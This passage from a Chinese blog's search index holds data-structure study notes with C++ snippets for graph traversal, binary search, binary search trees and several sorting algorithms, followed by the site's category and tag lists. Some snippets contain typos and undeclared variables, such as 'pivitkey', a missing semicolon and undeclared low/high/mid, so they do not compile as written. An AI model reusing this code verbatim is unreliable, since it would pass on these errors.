特点：若图中有n个顶点，a条边 无向图中，用邻接表表示，需要n个顶点结点，2a个边结点。 有向图中，用邻接表表示，若不考虑逆邻接表，只需 n 个顶点结点，a 个边结点。 网络的邻接表 图的遍历深度优先遍历（DFS） 1234567891011121314151617181920212223//连通图的深度遍历 template&lt;class T, class E&gt; void DFS (Graph&lt;T, E&gt;&amp; G, int v, bool visited[]) &#123; cout &lt;&lt; G.getValue(v) &lt;&lt; ' '; //访问顶点v visited[v] = true; //作访问标记 int w = G.getFirstNeighbor (v); //第一个邻接顶点 while (w != -1) &#123; //若邻接顶点w存在 if ( !visited[w] ) DFS(G, w, visited); //若w未访问过, 递归访问顶点w w = G.getNextNeighbor (v, w); //下一个邻接顶点 &#125;&#125;//图的深度优先搜索算法 template&lt;class T, class E&gt; void DFSTraverse (Graph&lt;T, E&gt;&amp; G, const T&amp; v) &#123; //从顶点v出发对图G进行深度优先遍历的主过程 int i, loc, n = G.NumberOfVertices(); //顶点个数 bool *visited = new bool[n]; //创建辅助数组 for (i = 0; i &lt; n; i++) visited [i] = false; //辅助数组初始化 loc = G.getVertexPos(v); DFS (G, loc, visited); //从顶点0开始深度优先搜索 delete [] visited; //释放visited &#125; 广度优先遍历（BFS） 12345678910111213141516171819202122232425//图的广度优先搜索算法 template &lt;class T, class E&gt; void BFS (Graph&lt;T, E&gt;&amp; G, const T&amp; v) &#123; int i, w, n = G.NumberOfVertices(); //图中顶点个数 bool *visited = new bool[n]; for (i = 0; i &lt; n; i++) visited[i] = false; int loc = G.getVertexPos (v); //取顶点号 cout &lt;&lt; G.getValue (loc) &lt;&lt; ' '; //访问顶点v visited[loc] = true; //做已访问标记 Queue&lt;int&gt; Q; Q.EnQueue (loc); //顶点进队列, 实现分层访问 图的广度优先搜索算法 while (!Q.IsEmpty()) &#123; //循环, 访问所有结点 Q.DeQueue (loc); w = G.getFirstNeighbor (loc); //第一个邻接顶点 while (w != -1) &#123; //若邻接顶点w存在 if (!visited[w]) &#123; //若未访问过 cout &lt;&lt; G.getValue (w) &lt;&lt; ‘ ’; //访问 visited[w] = true; Q.EnQueue (w); //顶点w进队列 &#125; w = G.getNextNeighbor (loc, w); //找顶点loc的下一个邻接点 &#125; &#125; delete [] visited; &#125; 最小生成树 画出该图的DFS和BFS生成树 DFS： BFS： Prim算法特点：将顶点归并 Kruskal算法特点：将边归并 最短路径非负权值的单源最短路径Dijkstra算法 AOV网AOV网：在一个有向图中，用顶点表示活动，用有向边表示活动先后次序的执行。这种有向图叫做顶点表示活动的AOV网络。 拓扑排序：按照有向图给出的次序关系，将图中顶点排成一个线性序列，对于有向图中没有限定次序关系的顶点，则可以人为加上任意的次序关系。由此所得顶点的线性序列称为拓扑有序序列，构造有向图的一个拓扑序列的过程称为拓扑排序。 eg： 搜索折半搜索基本思想：折半搜索时, 先求位于搜索区间正中的对象的下标mid，用其关键码与给定值x比较:Element[mid].key == x，搜索成功；Element[mid].key &gt; x，把搜索区间缩小到表的前半部分，继续折半搜索；Element[mid].key &lt; x，把搜索区间缩小到表的后半部分，继续折半搜索。 12345678910111213141516171819202122232425int BinSearch1(int r[ ], int n, int k)&#123; //数组r[1] ~ r[n]存放查找集合 low = 1; high = n; while (low &lt;= high) &#123; mid = (low + high) / 2; if (k &lt; r[mid]) high = mid - 1; else if (k &gt; r[mid]) low = mid + 1; else return mid; &#125; return 0;&#125;int BinSearch2(int r[ ], int low, int high, int k)&#123; //数组r[1] ~ r[n]存放查找集合 if (low &gt; high) return 0; else &#123; mid = (low + high) / 2; if (k &lt; r[mid]) return BinSearch2(r, low, mid-1, k); else if (k &gt; r[mid]) return BinSearch2(r, mid+1, high, k); else return mid; &#125; &#125; 二叉搜索树定义：二叉搜索树是具有以下性质的二叉树 所有结点的关键码互不相同。 左子树（如果非空）上所有结点的关键码都小于根结点的关键码。 右子树（如果非空）上所有结点的关键码都大于根结点的关键码。 左子树和右子树也是二叉搜索树。 123456789//搜索算法template&lt;class E, class K&gt;BSTNode&lt;E, K&gt;* BST&lt;E, K&gt;:: Search (const K x, BSTNode&lt;E, K&gt; *ptr) &#123; if (ptr == NULL) return NULL; else if (x &lt; ptr-&gt;data) return Search(x, ptr-&gt;left); else if (x &gt; ptr-&gt;data) return Search(x, ptr-&gt;right); else return ptr; //搜索成功 &#125;; 二叉搜索树的插入12345678910111213//插入template &lt;class E, class K&gt;bool BST&lt;E, K&gt;::Insert (const E&amp; e1, BSTNode&lt;E, K&gt; *&amp; ptr) &#123; //注意参数形式 if (ptr == NULL) &#123; //新结点作为叶结点插入 ptr = new BstNode&lt;E, K&gt;(e1); //创建新结点 if (ptr == NULL)&#123; cerr &lt;&lt; \"Out of space\" &lt;&lt; endl; exit(1); &#125; return true; &#125; else if (e1 &lt; ptr-&gt;data) return Insert (e1, ptr-&gt;left); else if (e1 &gt; ptr-&gt;data) return Insert (e1, ptr-&gt;right); else return false; //x已在树中,不再插入&#125;; 二叉搜索树的删除有三种情况： 被删的结点是叶子 被删结点只有左子树或只有右子树 被删结点既有左子树又有右子树 排序 直接插入排序基本思想：在插入第 i（i＞1）个记录时，前面的 i-1个记录已经排好序。 平均情况下排序的时间复杂度为 o(n2)。直接插入排序是一种稳定的排序方法。 希尔排序基本思想：将整个待排序记录分割成若干个子序列，在子序列内分别进行直接插入排序，待整个序列中的记录基本有序时，对全体记录进行直接插入排序。 gap通常取： $gap=\\lfloor gap/3\\rfloor+1$ 希尔排序是一种不稳定的排序算法。 eg： 123456789101112131415161718//希尔排序的算法void Shellsort (dataList&lt;T&gt;&amp; L, const int left, const int right) &#123; int i, j, gap = right-left+1; //增量的初始值为待排序个数 Element&lt;T&gt; temp; do &#123; gap = gap/3+1; //求下一增量值 for(i=left+gap;i&lt;=right;i++) if (L[i]&lt;L[i-gap]) &#123;//逆序 temp=L[i]; j = i-gap; do &#123; L[j+gap] = L[j]; j= j-gap; &#125; while (j&gt;=left &amp;&amp; temp&lt;L[j]); L[j+gap]=temp; //将vector[i]回送 &#125; &#125; while (gap &gt; 1);&#125;; 冒泡排序基本思想：两两比较相邻记录的关键码，如果反序则交换，直到没有反序的记录为止。 1234567891011void BubbleSort (T V[], int n ) &#123; bool exchange ; int i , j ; for (i=1;i&lt;n;i++)&#123; exchange = false; //标志为0假定未交换 for (j=n-1;j&gt;= i；j--) if (V[j-1]&gt;V[j]) &#123; //逆序 T temp=V[j-1]; V[j-1]=V[j]; V[j]=temp//交换 exchange = true; //标志置为1,有交换 &#125;if(exchange==false) return; &#125; 快速排序基本思想：取待排序序列中一个元素作为基准，按照该元素的排序码的大小，将整个元素分为左右两个子序列，左侧都小于该排序码，右侧都大于。然后，重复实行这个方法，直到序列有序。 123456789101112131415161718192021222324//快速排序的算法template &lt;class T&gt;void QuickSort (dataList&lt;T&gt;&amp; L, int left, int right) &#123;//对Vector[left..right]进行排if (left &lt; right) &#123; //元素序列长度大于1时 int pivotpos = L.Partition (left, right); //划分 QuickSort (L, left, pivotpos-1); QuickSort (L, pivotpos+1, right); &#125;&#125;；int Partition( SqList &amp;L, int low, int high)&#123; L.r[0] = L.r[low]; pivitkey = L.r[low].key; while( low &lt; high)&#123; while( low &lt; high &amp;&amp; L.r[high].key &gt;= pivotkey) --high; L.r[low] = L.r[high]; while( low &lt; high &amp;&amp; L.r[low].key &lt;= pivotkey) ++low; L.r[high] = L.r[low]; &#125; L.r[low] = L.r[0]; return low;&#125; 快速排序是一种不稳定的排序算法 堆排序","categories":[{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://pz1o.top/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"复习","slug":"复习","permalink":"https://pz1o.top/tags/%E5%A4%8D%E4%B9%A0/"},{"name":"数据结构","slug":"数据结构","permalink":"https://pz1o.top/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}]},{"title":"我的第一篇博客","slug":"我的第一篇博客","date":"2020-06-27T14:56:15.000Z","updated":"2020-11-20T14:20:18.797Z","comments":true,"path":"2020/06/27/我的第一篇博客/","link":"","permalink":"https://pz1o.top/2020/06/27/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/","excerpt":"","text":"2020/6/27 我的第一篇博客","categories":[],"tags":[]}],"categories":[{"name":"CTF","slug":"CTF","permalink":"https://pz1o.top/categories/CTF/"},{"name":"PWN","slug":"PWN","permalink":"https://pz1o.top/categories/PWN/"},{"name":"逆向","slug":"逆向","permalink":"https://pz1o.top/categories/%E9%80%86%E5%90%91/"},{"name":"笔记","slug":"笔记","permalink":"https://pz1o.top/categories/%E7%AC%94%E8%AE%B0/"},{"name":"BUU","slug":"BUU","permalink":"https://pz1o.top/categories/BUU/"},{"name":"开发","slug":"开发","permalink":"https://pz1o.top/categories/%E5%BC%80%E5%8F%91/"},{"name":"Docker","slug":"Docker","permalink":"https://pz1o.top/categories/Docker/"},{"name":"前端","slug":"前端","permalink":"https://pz1o.top/categories/%E5%89%8D%E7%AB%AF/"},{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://pz1o.top/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://pz1o.top/tags/CTF/"},{"name":"wp","slug":"wp","permalink":"https://pz1o.top/tags/wp/"},{"name":"PWN","slug":"PWN","permalink":"https://pz1o.top/tags/PWN/"},{"name":"逆向","slug":"逆向","permalink":"https://pz1o.top/tags/%E9%80%86%E5%90%91/"},{"name":"读书笔记","slug":"读书笔记","permalink":"https://pz1o.top/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"},{"name":"题解","slug":"题解","permalink":"https://pz1o.top/tags/%E9%A2%98%E8%A7%A3/"},{"name":"反弹shell","slug":"反弹shell","permalink":"https://pz1o.top/tags/%E5%8F%8D%E5%BC%B9shell/"},{"name":"总结","slug":"总结","permalink":"https://pz1o.top/tags/%E6%80%BB%E7%BB%93/"},{"name":"刷题","slug":"刷题","permalink":"https://pz1o.top/tags/%E5%88%B7%E9%A2%98/"},{"name":"开发","slug":"开发","permalink":"https://pz1o.top/tags/%E5%BC%80%E5%8F%91/"},{"name":"python","slug":"python","permalink":"https://pz1o.top/tags/python/"},{"name":"Docker","slug":"Docker","permalink":"https://pz1o.top/tags/Docker/"},{"name":"前端","slug":"前端","permalink":"https://pz1o.top/tags/%E5%89%8D%E7%AB%AF/"},{"name":"学习","slug":"学习","permalink":"https://pz1o.top/tags/%E5%AD%A6%E4%B9%A0/"},{"name":"复习","slug":"复习","permalink":"https://pz1o.top/tags/%E5%A4%8D%E4%B9%A0/"},{"name":"数据结构","slug":"数据结构","permalink":"https://pz1o.top/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}]}